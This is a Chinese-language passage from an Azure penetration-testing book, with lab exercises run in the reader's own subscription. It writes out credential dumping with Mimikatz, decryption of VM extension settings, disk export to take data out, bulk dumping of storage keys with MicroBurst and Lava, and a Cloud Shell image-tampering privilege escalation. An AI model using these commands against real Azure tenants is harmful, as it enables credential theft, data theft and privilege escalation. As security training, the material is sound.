  \ GitHub 下载 Mimikatz：https://github.com/gentilkiwi/mimikatz。\n+   7. 运行 Mimikatz\
  \ 可执行文件，并使用 sekurlsa::minidump lsass.dmp 命令将 .dmp 文件加载到 Mimikatz 中。\n\n8. 你可以使用完整的\
  \ sekurlsa::logonPasswords 命令提取系统中最近登录用户的凭据（哈希和/或明文）：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_216_0.png)\n\
  \n图 5.27 – Mimikatz 输出示例\n\n请记住，这是从系统中获取 LSASS 内存转储的最简单方法之一。创建转储文件或访问 LSASS 内存空间的方法有很多种，而这种方法可能并不总是奏效。\n\
  \n虽然这并不是在 Azure 中运行 Mimikatz 的全面指南，但希望它能帮助你开始了解从 LSASS 内存空间解析凭据的基础知识。接下来，我们将从内存转向文件，开始分析\
  \ VM 扩展设置文件。\n\n#### 从 VM 扩展设置中收集凭据\n\n如前所述，VM 扩展是 VM 整体管理的一部分。虽然它们更常用于应用补丁和微小的配置更改，但它们也用于我们之前用于命令执行的\
  \ Run Command 基础设施中。\n\n作为扩展执行和日志记录的一部分，它们会将扩展配置文件与日志存储在 VM 上。解析这些文件可以获取敏感信息，包括凭据。其中最主要的问题之一是域加入扩展，它最终可能会存储用于将\
  \ VM 加入域的凭据。\n\n> **重要说明**\n> \n> 要警惕域加入凭据。它们不仅可能记录在 Run Command 扩展日志中，还可能出现在未正常关闭的\
  \ PowerShell ISE 会话中。\n> \n> 作为 VM 上的默认本地管理员账户，你可以打开 PowerShell ISE，查看是否有任何脚本被自动恢复。作者曾见过许多这样的情况：管理员通过\
  \ ISE 中执行的脚本将 VM 加入域，但由于未正常关闭，在下次使用本地管理员用户启动 ISE 会话时，这些凭据可能会被恢复。\n\n作为 VM 上的本地管理员，我们可以使用\
  \ VM 上的证书来解密 VM 扩展存储的受保护设置。要从扩展中提取这些数据点，我们将采取以下步骤：\n\n+   1. 在 Windows VM 上以本地管理员身份打开\
  \ PowerShell 会话。\n+   2. 从 MicroBurst 工具包导入 `Get-AzureVMExtensionSettings` 函数：`https://github.com/NetSPI/MicroBurst/blob/master/Misc/Get-AzureVMExtensionSettings.ps1`。\n\
  +   3. 运行 `Get-AzureVMExtensionSettings` 函数并观察结果。\n\n运行此脚本后，你应该会在输出中看到多个 `ProtectedSettingsDecrypted`\
  \ 实例，其中包含敏感的扩展信息。如果你之前按照命令执行技术进行了操作，你还应该在结果中看到你之前发出的命令。\n\n> **重要说明**\n> \n> 由于\
  \ Jake Karnes 更能解释让我们能够读取这些文件的核心问题，请查看他的博客，其中解释了该问题的来源和利用方式：`https://blog.netspi.com/decrypting-azure-vm-extension-settings-with-get-azurevmextensionsettings/`。\n\
  \n既然我们已经介绍了提取凭据的内存和磁盘选项，接下来让我们通过 Azure 磁盘导出功能来看一种更静态的分析类型。\n\n#### 利用磁盘导出和快照导出功能\n\
  \n与本地 VM 类似，Azure VM 也挂载了虚拟磁盘用于数据存储。Azure VM 至少挂载一个操作系统磁盘，但也可能挂载额外的数据磁盘。这些磁盘可能包含渗透测试人员可以在后续攻击阶段利用的有用信息。\n\
  \nAzure 平台有一个名为 Disk Export 的功能，可用于生成临时公共共享访问签名（SAS）URL 来下载 VM 磁盘。此功能旨在让管理员和开发人员更轻松地将磁盘从一个\
  \ Azure 区域复制到另一个区域，例如用于灾难恢复场景。攻击者也可以利用此功能将数据外泄到组织外部！\n\n要从 Azure 门户使用此功能，你可以转到 Azure\
  \ 中的“磁盘”边栏选项卡，选择磁盘，单击“磁盘导出”选项，然后按图 5.28 中突出显示的“生成 URL”按钮：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_218_0.png)\n\
  \n图 5.28 – 磁盘导出的 URL 生成\n\n需要注意的是，磁盘导出功能只能用于未挂载到正在运行的 VM 的磁盘。如果磁盘已挂载到正在运行的 VM，我们可以先创建磁盘的快照，然后使用类似的快照导出功能（图\
  \ 5.29）生成临时 SAS URL，通过该 URL 从互联网下载快照：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_219_0.png)\n\
  \n图 5.29 – 快照 URL 功能\n\n由于许多原因，这些磁盘和快照最终可能会存储在存储帐户中。当这些存储帐户中的文件被公开时，这可能会产生额外的影响。\n\
  \n> **重要说明**\n> 下载 VHD 文件时，请记住文件的大小。从 Azure 门户进行的典型 HTTP 下载可能难以处理大型磁盘。此外，你可能希望使用具有足够磁盘空间的\
  \ Azure VM 来复制 VHD 文件。通过使用 Azure 背板网络复制到 VM 磁盘，可以在下载过程中节省大量时间。\n\n如前所述，下载 Azure\
  \ 虚拟磁盘可能会对带宽产生显著影响，因此实际操作中可能不是最有趣的体验。在渗透测试中，当你可以访问磁盘上的所有文件和密码哈希时，你的耐心会得到回报。此外，我们甚至可以在\
  \ Hyper-V 中启动 VHD 文件。\n\n另外需要注意的一点是磁盘使用的加密方式。如果磁盘使用客户管理的密钥（请参阅“加密”选项卡）加密，你将需要从密钥保管库中获取密钥来解密。这超出了本书的范围，但你在处理磁盘时需要牢记这一点。\n\
  \n#### 动手练习 – 使用 PowerZure 外泄 VM 磁盘\n\n在本练习中，我们将利用 Azure VM 的磁盘导出功能来外泄未挂载或保留的 VM\
  \ 磁盘。以下是我们将在本练习中完成的任务：\n\n+   1. 在你的渗透测试 VM 上打开 PowerShell。\n+   2. 使用以下命令对 Azure\
  \ 进行身份验证。出现提示时，输入本章前面场景设置脚本中创建的 contributoruser 账户的凭据：\n+   3. 在 PowerShell 控制台中，使用以下命令导入\
  \ PowerZure 模块：\n+   4. 使用以下命令获取所有未挂载 VM 磁盘的列表：\n\n```\nPS C:\\> Connect-AzAccount\n\
  ```\n\n```\nPS C:\\> cd C:\\Users\\$env:USERNAME\\PowerZure\n```\n\n```\nPS C:\\\
  > Import-Module .\\PowerZure.ps1\n```\n\n以下是命令的屏幕截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_220_0.png)\n\
  \n图 5.30 – 将 PowerZure 导入到会话中\n\n```\nPS C:\\> Get-AzDisk | Where-Object {$_.DiskState\
  \ -ne \"Attached\"} | Select Name, DiskState, Encryption\n```\n\n以下是命令输出的屏幕截图：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_221_0.png)\n\n图 5.31 – 可用于导出的磁盘\n\n命令的输出应返回所有当前未挂载到正在运行的\
  \ VM 的托管磁盘及其加密状态。在你的输出中，你应该会看到一个名称以 winvm02 开头的磁盘；请记下该磁盘名称，下一步将需要用到它。\n\n+   5.\
  \ 在 PowerShell 控制台中，使用以下命令生成一个可公开访问的 URL，以导出上一步中标识的磁盘。将 <DISK_NAME_FROM_STEP_4>\
  \ 占位符替换为上一步中标识的磁盘名称：\n\n```\nPS C:\\> Get-AzureVMDisk -DiskName <DISK_NAME_FROM_STEP_4>\n\
  ```\n\n以下是命令及其输出的屏幕截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_221_1.png)\n\n\
  图 5.32 – 磁盘导出 URL 生成\n\nGet-AzureVMDisk 是一个 PowerZure 模块，它利用磁盘导出功能生成下载 VM 磁盘的链接。你应该会从命令输出中获得一个\
  \ URL。请记下此 URL，下一步将需要用到它。\n\n+   6. 最后一步完全可选。如果你想在此节省时间、带宽和磁盘空间，可以暂停练习，记住这项技术，以便在未来的测试中遇到磁盘时使用。除了对磁盘进行一些取证以查找文件和哈希之外，在练习的这个阶段，我们暂时没有太多其他事可做。\n\
  \n\n\n\n如果要下载磁盘，请打开一个 Web 浏览器并浏览到上一 步中获得的 URL，从互联网下载磁盘：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_222_0.png)\n\
  \n图 5.33 – 在浏览器中启动磁盘下载\n\n此时，我们将可以访问该 VM 的 VHD 硬盘文件。此文件可以直接挂载到另一台 VM 中，并且此时可以解析出敏感文件和\
  \ Windows 密码哈希。\n\n#### 实践练习 – 清理 Contributor（IaaS）利用场景\n\n在本最终练习中，我们将使用清理脚本来自动化删除本章场景中设置的资源。以下是本练习中我们将完成的任务：\n\
  \n- 从 GitHub 下载清理脚本。\n- 运行脚本以删除为场景创建的对象和资源。\n\n以下是完成这些任务的步骤：\n\n1. 打开一个 Web 浏览器并浏览到\
  \ `https://portal.azure.com` 上的 Azure 门户。使用 `azureadmin` 凭据登录。\n2. 在 Azure 门户中，单击\
  \ Azure 门户右上角的 Cloud Shell 图标。选择 **PowerShell**：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_222_1.png)\n\
  \n图 5.34 – 打开 Cloud Shell 的链接\n\n3. 在 Cloud Shell 窗格内的 PowerShell 会话中，运行以下命令下载用于删除本章场景创建的资源的脚本。同时，验证下载：\n\
  \n```\nPS C:\\> Invoke-WebRequest https://bit.ly/contributor-iaas-scenarios-cleanup\
  \ -O contributor-iaas-scenarios-cleanup.ps1\nPS C:\\> Get-ChildItem\n```\n\n以下是其外观的屏幕截图：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_223_0.png)\n\n图 5.35 – 下载脚本的结果\n\n4.\
  \ 运行下载的脚本以使用以下命令删除本章练习中创建的对象和资源：\n\n```\nPS C:\\> ./contributor-iaas-scenarios-cleanup.ps1\n\
  ```\n\n等待脚本完成。完成可能需要大约 8 分钟：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_223_1.png)\n\
  \n图 5.36 – 运行清理脚本的结果\n\n恭喜！你已完成本章中的所有练习场景，并成功从你的订阅中删除了设置的资源。\n\n#### 总结\n\n正如本章所述，攻击\
  \ Azure 中托管的 VM 有很多方法。作为渗透测试人员，我们需要准备好在多个不同层面上攻击 VM。这可能是在平台层级（从门户运行命令）、运行中的操作系统层级（提取凭据）或操作系统磁盘层级（提取哈希）。所有这些技能的结合将使我们在攻击\
  \ Azure 环境时更加全面。\n\n虽然 VM 可能是云服务的初始用例之一，但越来越多的组织开始将新应用程序构建为 *cloud-native* 部署。这意味着应用程序依赖于\
  \ Azure 中许多平台即服务资源。我们将在下一章看到攻击这些服务的许多方法。\n\n在下一章中，我们将更仔细地研究 Azure 中的 **Platform\
  \ as a Service (PaaS)** 服务，以及攻击者可能如何利用配置并从服务中收集凭据。\n\n#### 进一步阅读\n\n如果你想在该主题上了解更多，请查看以下资源：\n\
  \n- *Run PowerShell scripts in your Windows VM by using Run Command:*\n  `https://docs.microsoft.com/en-us/azure/virtual-machines/windows/run-command`\n\
  - *Run shell scripts in your Linux VM by using Run Command:*\n  `https://docs.microsoft.com/en-us/azure/virtual-machines/linux/run-command`\n\
  - Reset the local administrator password using the VMAccess extension:\n  `https://docs.microsoft.com/en-us/troubleshoot/azure/virtual-machines/reset-rdp`\n"
- "### 6\n利用 PaaS 服务上的 Contributor 权限\n\n在上一章中，我们探讨了如何使用 Contributor 角色来利用 Azure 资源进行以\
  \ **Infrastructure as a Service (IaaS)** 为中心的场景。我们重点介绍了如何利用 Contributor 角色的凭据将权限提升到\
  \ Azure RBAC Owner 角色、搜寻其他凭据以及从虚拟机中窃取数据。在本章中，我们将探讨如何为 **Platform as a Service (PaaS)**\
  \ 场景实现类似目标。本章中一些通用概念会重叠，但我们将重点关注这些概念在应用于 PaaS 场景时的不同之处。\n\n在本章中，我们将涵盖以下主要主题：\n\n\
  - 为 Contributor（PaaS）利用场景做准备\n- 攻击存储账户\n- 从密钥库中掠夺密钥、机密和证书\n- 利用 Web 应用进行横向移动和权限提升\n\
  - 从自动化账户中提取凭据\n\n#### 为 Contributor（PaaS）利用场景做准备\n\n要跟随本章的练习，你需要在自己的 Azure 订阅中设置一个具有\
  \ Contributor 权限的用户和一些易受攻击的工作负载配置。如同之前的章节，我们已使用 PowerShell 脚本来自动化此过程，你可以从 Azure\
  \ Cloud Shell 运行。在继续之前，请确保你已运行清理脚本以删除之前章节的资源。这将帮助我们避免任何脚本执行异常。\n\n以下是本练习中我们将完成的任务：\n\
  \n- **Task 1**：创建具有 Contributor 权限的测试用户账户。\n- **Task 2**：为所有场景部署易受攻击的工作负载。\n\n让我们开始：\n\
  \n1. 打开一个 Web 浏览器并浏览到 https://portal.azure.com 上的 Azure 门户。使用你的 azureadmin 凭据登录。\n\
  2. 在 Azure 门户中，单击右上角的 Cloud Shell 图标。选择 PowerShell：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_226_0.png)\n\
  \n图 6.1 – 单击图标打开 Cloud Shell\n\n3. 在 Cloud Shell 窗格内的 PowerShell 会话中，运行以下命令下载用于创建具有\
  \ Contributor 权限的用户账户并设置所需易受攻击工作负载的脚本。通过列出目录内容来验证下载：\n\n```\nPS C:\\> Invoke-WebRequest\
  \ http://bit.ly/contributor-paas-scenarios -O contributor-paas-scenarios.ps1\nPS\
  \ C:\\> Get-ChildItem\n```\n\n以下是缩短 URL 指向的目标 GitHub URL：https://raw.githubusercontent.com/PacktPublishing/Penetration-Testing-Azure-for-Ethical-Hackers/main/chapter-6/resources/contributor-paas-scenario.ps1。\n\
  \n以下是其外观的屏幕截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_227_0.png)\n\n图 6.2 –\
  \ 下载 Contributor PaaS 场景脚本\n\n4. 运行下载的脚本以使用以下命令为本章练习配置所需的对象和资源：\n\n```\nPS C:\\\
  > ./contributor-paas-scenarios.ps1\n```\n\n在提示输入密码时，输入 myPassword123 并按 Enter。等待脚本部署完成。部署可能需要大约八分钟才能完成：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_227_1.png)\n\n图 6.3 – 运行 Contributor\
  \ IaaS 场景脚本\n\n##### 脚本做了什么？\n\n脚本在 Azure 订阅中创建具有 Contributor 权限的用户账户。脚本还设置了图 6.4\
  \ 中显示的资源和对象：\n\n- 具有关联托管标识的 Web 应用\n- Azure SQL 数据库和具有防火墙规则的 Azure 存储\n- 具有机密、密钥和证书的\
  \ Azure Key Vault\n- 一个 Azure Automation 账户\n- 一台 Ubuntu Linux VM：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_228_0.png)\n\
  \n图 6.4 – Contributor PaaS 利用场景\n\n5. 脚本完成后，你将需要在本练习其余部分使用的关键信息会显示在输出部分。将信息复制到记事本文档以供日后参考。你需要从输出部分获取四个值：\n\
  \n**Azure Contributor User**：这是对 Azure 订阅具有 Contributor 权限的 Azure 管理员用户名。\n\n**Azure\
  \ Contributor User Password**：这是 Azure Contributor 管理员用户的密码。\n\n\n\n\nLinux VM FQDN：用于在其中一个练习中挂载映像的\
  \ Linux VM 的 FQDN。这是必需的，因为 PentestVM 上实现的 WSL 尚不支持此功能。\n\nLinux VM 密码：这是用于在其中一个练习中挂载映像的\
  \ Linux VM 的密码：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_229_0.png)\n\n图 6.5\
  \ – 获取脚本输出\n\n现在，你已经成功创建了本章后续练习将使用的资源。本章中我们将探索的第一个资源是存储帐户。\n\n#### 攻击存储帐户\n\nAzure\
  \ 存储帐户是 Azure 中的主要数据存储解决方案。其他 Azure 服务（例如应用服务和容器注册表）在后端依赖它进行数据存储。该解决方案本身提供了五项服务，可用于存储不同类型的数据集，包括非结构化应用程序数据对象（Azure\
  \ Blob 存储）、NoSQL 存储中的半结构化应用程序数据（Azure 表存储）、云中的托管文件共享（Azure 文件）、用于可靠消息传递的消息存储（Azure\
  \ 队列存储），以及用于大数据工作负载的数据湖（Azure Data Lake Storage Gen2）。可想而知，这项服务是攻击者的首要目标！就本章而言，我们将重点关注\
  \ Azure Blob 存储和 Azure 文件：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_229_1.png)\n\
  \n图 6.6 – Azure 存储\n\nContributor 角色有权读取和修改此服务管理平面上的任何配置（向其他用户分配权限除外），但基于 RBAC 权限，它并不固有地拥有读取或修改数据平面中数据的权限（图\
  \ 6.7）。这听起来可能令人困惑，但请注意，Contributor 角色策略文档并未指定任何 dataActions 权限：\n\n```\n\"permissions\"\
  : [\n  {\n    \"actions\": [\n      \"*\"\n    ],\n    \"notActions\": [\n     \
  \ \"Microsoft.Authorization/*/Delete\",\n      \"Microsoft.Authorization/*/Write\"\
  ,\n      \"Microsoft.Authorization/elevateAccess/Action\",\n      \"Microsoft.Blueprint/blueprintAssignments/write\"\
  ,\n      \"Microsoft.Blueprint/blueprintAssignments/delete\",\n      \"Microsoft.Compute/galleries/share/action\"\
  \n    ],\n    \"dataActions\": [],\n    \"notDataActions\": []\n  }\n]\n```\n\n\
  角色可以做什么\n\n角色不能做什么\n\n默认情况下，该角色在数据平面上没有任何权限\n\n图 6.7 – Azure Contributor 权限\n\n\
  Azure AD 标识需要被授予额外的 dataActions 权限（例如图 6.8 中列出的权限），才能使用 Azure AD 访问令牌访问数据平面。随着 Microsoft\
  \ 越来越倾向于通过 Azure RBAC 公开服务数据平面访问权限的这种模式，在 Azure 中利用服务数据平面的机会将会更多，而无需转向其他选项：\n\n\
  |  | 角色 | 说明 |\n|---|---|---|\n| ☐ | Storage Blob Data Contributor | 允许对 Azure 存储\
  \ blob 容器和数据进行读取、写入和删除访问 |\n| ☐ | Storage Blob Data Owner | 允许对 Azure 存储 blob 容器和数据进行完全访问，包括分配\
  \ POSIX 访问控制 |\n| ☐ | Storage Blob Data Reader | 允许对 Azure 存储 blob 容器和数据进行读取访问 |\n\
  | ☐ | Storage File Data SMB Share Contributor | 允许通过 SMB 对 Azure 存储文件共享进行读取、写入和删除访问\
  \ |\n| ☐ | Storage File Data SMB Share Elevated Co... | 允许通过 SMB 对 Azure 存储文件共享进行读取、写入、删除以及修改\
  \ NTFS 权限访问 |\n| ☐ | Storage File Data SMB Share Reader | 允许通过 SMB 对 Azure 文件共享进行读取访问\
  \ |\n| ☐ | Storage Queue Data Contributor | 允许对 Azure 存储队列和队列消息进行读取、写入和删除访问 |\n\
  | ☐ | Storage Queue Data Message Processor | 允许对 Azure 存储队列消息进行查看、接收和删除访问 |\n| ☐\
  \ | Storage Queue Data Message Sender | 允许发送 Azure 存储队列消息 |\n| ☐ | Storage Queue\
  \ Data Reader | 允许对 Azure 存储队列和队列消息进行读取访问 |\n\n图 6.8 – Azure 存储相关角色\n\n从攻击的角度来看，我们可以利用管理平面上的权限来获取可用于访问数据平面中存储的数据的密钥和/或令牌。我们可以利用的管理平面权限如下：\n\
  \n- `Microsoft.Storage/storageAccounts/listkeys/action`：允许 Contributor 角色读取存储帐户的访问密钥。这些访问密钥可提供对数据平面的完全访问权限。\n\
  - `Microsoft.Storage/storageAccounts/listAccountSas/action`：允许 Contributor 角色在存储帐户级别生成用于数据平面访问的\
  \ SAS 令牌。\n- `Microsoft.Storage/storageAccounts/listServiceSas/action`：允许 Contributor\
  \ 角色在服务级别生成用于数据平面访问的 SAS 令牌。\n\n值得注意的是，我们在*第 4 章，利用读者权限*中介绍的 READER 角色不具备这些权限。\n\
  \n诸如 MicroBurst 和 Lava 之类的攻击工具会利用上述权限大规模列出这些存储帐户密钥，然后可以使用这些密钥下载存储帐户服务的内容。另外，如果你想知道为什么具有\
  \ Contributor 权限的用户在使用 Azure 门户时能够列出存储帐户中的对象，那是因为门户利用 Contributor 的权限来访问存储帐户密钥，然后使用基于密钥的身份验证在门户中显示数据。切换到\
  \ Azure AD 授权将显示 Contributor 和 Owner 角色默认没有 dataActions 权限。\n\n在下一节中，我们将使用 MicroBurst\
  \ 工具包来收集订阅中存储帐户的这些密钥。\n\n#### 动手实验 – 使用 MicroBurst 转储 Azure 存储密钥\n\n以下是我们在本练习中要完成的任务：\n\
  \n- **任务 1：** 使用 MicroBurst 大规模提取存储帐户密钥。\n- **任务 2：** 使用 Azure Storage Explorer\
  \ 浏览和下载存储帐户数据。\n\n6. 使用 Get-AzPasswords 函数对 Azure 存储实例执行全面转储。该函数也可用于提取其他 PaaS 服务的数据平面密钥，但我们暂时通过为这些参数使用\
  \ N 选项来排除这些服务：\n\n```\nGet-AzPasswords -AutomationAccounts N -AppServices N -Keys\
  \ N -ACR N -CosmosDB N -Verbose | Out-GridView\n```\n\n7. 当提示选择 Azure 订阅时，选择你的测试\
  \ Azure 订阅，然后单击“确定”：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_233_0.png)\n\n\
  图 6.11 - 选择适当的订阅\n\n8. 在生成的输出中，你应该会看到从存储帐户中转储的凭据。这些凭据可用于访问这些服务以窃取数据或搜寻其他凭据。在输出窗口中，查找名称格式为\
  \ privstoreXXXXXX 的存储帐户。使用 Ctrl + C 复制其中一行：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_233_1.png)\n\
  \n图 6.12 - MicroBurst 存储帐户密钥输出\n\n9. 在 Pentest VM 中，打开 PowerShell 提示符并使用以下命令安装 Azure\
  \ Storage Explorer：\n\n```\nchoco install microsoftazurestorageexplorer -y\n```\n\
  \n以下是命令的输出：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_234_0.png)\n\n图 6.13 – 安装\
  \ Azure Storage Explorer\n\n10. 在 Pentest VM 中，单击“开始”按钮，搜索“Storage Explorer”，然后选择“Storage\
  \ Explorer”选项：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_234_1.png)\n\n图 6.14\
  \ – 打开 Storage Explorer\n\n11. 在“连接到 Azure 存储”窗口中，选择“存储帐户”：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_235_0.png)\n\
  \n图 6.15 – 添加存储帐户\n\n12. 在“选择身份验证方法”窗口中，选择“帐户名称和密钥”，然后单击“下一步”：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_235_1.png)\n\
  \n图 6.16 – 选择帐户名称和密钥\n\n\n\n13. 在“输入连接信息”窗口中，输入以下信息：\n\n显示名称：来自本练习第 8 步的账户名称\n\n\
  账户名称：来自本练习第 8 步的账户名称\n\n账户密钥：来自本练习第 8 步的账户密钥\n\n单击“下一步”：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_236_0.png)\n\
  \n图 6.17 – 使用访问密钥进行身份验证\n\n14. 在“摘要”窗口中，单击“连接”。\n\n15. 查看这些文件，并注意我们现在可以持久访问存储账户及其所有服务的内容。这为攻击者提供了很大的破坏空间。例如，攻击者可以在勒索软件攻击中加密服务中的数据、向\
  \ NoSQL 表存储注入恶意数据，或通过存储队列对应用程序投毒：\n\n##### 图 6.18 – 访问存储账户中的敏感信息\n\n虽然本练习不会使用 Lava，但值得注意的是，Lava\
  \ 有一个名为 stg_blob_download 的模块，可以自动利用此场景下载 Azure 订阅中的所有 blob 容器（图 6.19）：\n\n```\n\
  Lava $> exec_stg_blob_download\n[+] getting storage accounts in subscription...\
  \ [+]\n[+] getting the account names [+]\n[+] getting the resource group names [+]\n\
  [+] getting the storage endpoint names [+]\n\n[+] getting the account keys [+]\n\
  [+] getting the storage containers [+]\n[+] starting download [+]\n[+] files will\
  \ be saved to /tmp/c2653a362426ec0697ec85a9315828a3 [+]\n\n1/57: \"CREDITS.txt\"\
  [#####################################]\n2/57: \"assets/css/font-awesome.min.css\"\
  [#####################################]\n3/57: \"assets/css/main.css\"[#####################################]\n\
  4/57: \"assets/fonts/FontAwesome.otf\"[#####################################]\n\
  5/57: \"assets/fonts/fontawesome-webfont.eot\"[#####################################]\n\
  ```\n\n##### 图 6.19 – 使用 Lava 下载 blob 文件\n\n请注意，某些存储容器可能包含大量数据，因此运行此 Lava 模块存在一定风险。在开始下载整个容器之前，请确保你了解将要下载的内容。在渗透测试项目中，这一点需要格外小心，因为账户中可能存在个人身份信息（PII）。\n\
  \n既然我们已经了解了如何保持与存储账户的连接，接下来，让我们在存储账户的范畴内转换思路，攻击 Cloud Shell 存储文件以实现权限提升。\n\n####\
  \ 攻击 Cloud Shell 存储文件\n\n如果你一直在跟做本书的示例，你应该对 Azure Cloud Shell（基于浏览器的命令行界面）非常熟悉。但如果我们告诉你，让你使用这个\
  \ shell 实际上是在为你埋下失败的伏笔呢？我们知道，你对我们作者寄予了极大的信任，如果我们辜负了这份信任，我们深表歉意。那么，让我们花点时间，通过向你展示如何利用这个你自己创建的脆弱环境，从当前情况中吸取教训。\n\
  \n当你第一次以 azureadmin 用户身份使用 Cloud Shell 时，系统会提示你在存储账户的文件服务中创建一个文件共享。如果你选择了默认选项，平台会自动创建一个名称前缀为\
  \ cs 的专用存储账户来托管该文件共享（图 6.20）。你也可以选择使用现有存储账户来托管此共享。\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_238_0.png)\n\
  \n图 6.20 – Cloud Shell 存储账户示例\n\n存储账户中的这个文件共享服务用于跨会话持久保存数据。创建后，它会被自动挂载为用户后续 Cloud\
  \ Shell 会话中 $Home 目录下的 clouddrive 文件夹。你可以通过在 Cloud Shell（Bash 或 PowerShell）中运行 ls\
  \ 命令来验证这一点，如图 6.21 所示：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_238_1.png)\n\n\
  图 6.21 – Cloud Shell 会话中挂载的文件共享\n\n但这个文件共享背后又是什么呢？该共享以 .img 文件的形式存储一个 EXT2 文件系统。\n\
  \n共享名称和镜像文件名通常能够表明 Cloud Shell 所关联的 Azure AD 用户。在图 6.22 中，我们可以看到 cs-azureadmin-azurepentesting-com-1003200107d764bc\
  \ 文件共享包含 acc_azureadmin.img 文件（位于 .cloudconsole 文件夹下）。可以将此信息与 Azure AD/RBAC 侦察结果相关联，以确定该\
  \ shell 的用户是否被授予了特权权限。\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_239_0.png)\n\n\
  图 6.22 – Cloud Shell 文件示例\n\n那么，这里的攻击场景是什么呢？如前所述，每次启动时，这个 IMG 文件都会被挂载到用户 Cloud Shell\
  \ 会话的主目录。由于 Contributor 角色拥有（通过存储账户密钥）下载此 IMG 文件的权限，我们可以利用该访问权限将 IMG 文件下载并挂载到 Linux\
  \ 系统上。\n\n此时，我们既可以读取文件中的任何敏感信息，也可以修改文件，使其在目标账户下次挂载时运行命令。如果我们锁定正确的账户，就有机会在权限更高的用户（如\
  \ Azure AD 全局管理员或订阅所有者）的 Cloud Shell 会话中运行命令，从而实现权限提升。\n\n> **重要说明**\n> 有关此攻击原始研究的完整文章，请参阅以下\
  \ NetSPI 博客：https://www.netspi.com/blog/technical/cloud-penetration-testing/attacking-azure-cloud-shell/。\n\
  \n在下一个练习中，我们假设你已经按照说明在 Cloud Shell 中运行了所有环境设置脚本。至少，我们假设你已经为一直在使用的 azureadmin 用户账户设置好了\
  \ Cloud Shell 存储账户。\n\n#### 动手实验 – 使用 Cloud Shell 账户提升权限\n\n在本实验中，我们将利用 Cloud Shell\
  \ 卷镜像，在特权用户使用 Cloud Shell 时，以该用户的权限运行敏感命令。我们将介绍的过程分为四个步骤，如图 6.23 所示。首先，下载权限更高的用户的\
  \ Cloud Shell 卷镜像；然后，将镜像挂载到之前部署的 Linux VM 上；接着，植入我们希望运行的命令，并重新上传回 Cloud Shell 文件共享。\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_240_0.png)\n\n图 6.23 – Cloud Shell 文件示例\n\
  \n本实验将完成以下任务：\n\n- 任务 1：使用 Lava 大规模扫描 Azure 文件共享。\n- 任务 2：使用 Lava 下载 Azure 文件共享中的文件。\n\
  - 任务 3：利用 Cloud Shell 镜像并将其重新上传。\n- 任务 4：验证权限提升利用。\n\n以下是完成这些任务的步骤：\n\n- 1. 在到你的\
  \ Pentest Windows VM 的 RDP 会话中，以管理员身份打开 PowerShell。\n- 2. 在 PowerShell 控制台中，键入以下命令，通过\
  \ SSH 登录之前创建的 pentest Linux VM。将 <linux_FQDN> 替换为之前脚本输出中 Linux VM FQDN 的值。当提示确认主机真实性时，键入\
  \ yes 并按 Enter。当提示输入密码时，输入之前脚本输出中 Linux VM Password 的值。\n- 3. 在 pentest Linux VM\
  \ 的 Bash shell 中，使用以下命令切换到 root 用户：\n- 4. 使用以下命令，通过 Azure CLI 以 Contributor 用户身份向\
  \ Azure 进行身份验证。将 <domain_name> 替换为你的 Azure AD 域名。同时，将 <contributor_user_password>\
  \ 替换为 contributoruser 账户的密码：\n\n```\nssh pentestadmin@<linux_FQDN>\n```\n\n以下是命令及其输出的截图：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_241_0.png)\n\n图 6.24 – SSH 登录 Linux VM\n\
  \n```\npentestadmin@ptlinuxvm:~# sudo su -\n```\n\n```\naz login -u contributoruser@<domain_name>\
  \ -p <contributor_user_password>\n```\n\n以下是输出的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_242_0.png)\n\
  \n图 6.25 – 从 Linux VM 使用 Azure CLI 登录\n\n5. 使用以下命令下载并运行 Lava：\n\n```\ngit clone\
  \ https://github.com/mattrotlevi/lava.git\n```\n\n```\ncd lava/\n```\n\n```\npython3\
  \ lava.py\n```\n\n以下是输出的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_242_1.png)\n\
  \n图 6.26 – Lava 命令的输出\n\n\n\n\n6. 使用以下命令验证当前用户和权限：\n\n```\nexec_priv_show\n```\n\
  \n从输出中可以看到，该用户仅拥有 Contributor 角色分配：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_243_0.png)\n\
  \n图 6.27 – Lava 中显示的 Contributor 用户权限\n\n7. 扫描 Azure 订阅中的文件共享，以查找潜在的 Cloud Shell\
  \ 镜像。可以使用以下 Lava 命令执行此操作：\n\n```\nexec_stg_file_scan\n```\n\n此命令利用对访问密钥的访问权限来扫描\
  \ Azure 订阅中的文件共享。可以看到，我们有一个供 Azure Cloud Shell 使用的文件共享：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_243_1.png)\n\
  \n图 6.28 – Lava 识别敏感文件\n\n8. 使用以下命令下载 Azure 文件共享中的文件。我们假设您是在一个隔离的 Azure 环境中执行此练习，该环境只有少数几个文件共享。在具有多个文件共享的环境中运行上述命令可能需要很长时间才能完成：\n\
